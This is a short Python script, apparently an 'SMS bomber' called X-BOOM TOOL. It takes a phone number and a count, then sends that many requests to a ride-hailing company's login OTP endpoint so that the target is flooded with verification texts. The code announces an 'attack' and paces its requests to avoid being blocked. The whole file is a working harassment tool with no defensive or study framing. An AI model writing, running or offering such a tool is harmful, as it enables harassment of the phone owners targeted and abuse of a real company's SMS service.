import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: SMS API UPDATED (2026)     ")
    print("========================================")

def send_sms(target, count):
    # Pathao API for testing
    url = "https://api-hermes.pathao.com/user/otp-send/login"
    
    # Cleaning the number (removing 88 if added)
    if target.startswith("01"):
        phone = "+88" + target
    else:
        phone = target

    payload = {"phone": phone}
    
    print(f"\n[+] Attack started on: {target}")
    for i in range(count):
        try:
            # Sending Request
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print(f"[!] SMS {i+1} sent successfully!")
            else:
                print(f"[?] Failed (Server Busy) SMS {i+1}")
        except:
            print(f"[-] Network Error at SMS {i+1}")
        
        # 2 seconds gap to avoid getting blocked
        time.sleep(2)

def main():
    banner()
    print("\n[1] Start SMS Bomber")
    print("[2] Exit")
    choice = input("\nSelect an option: ")
    if choice == '1':
        number = input("Enter Phone Number (01xxxxxxxxx): ")
        amount = int(input("Enter SMS Amount: "))
        send_sms(number, amount)
        print("\n[+] Task Completed!")
    else:
        print("Exiting...")

if __name__ == "__main__":
    main()

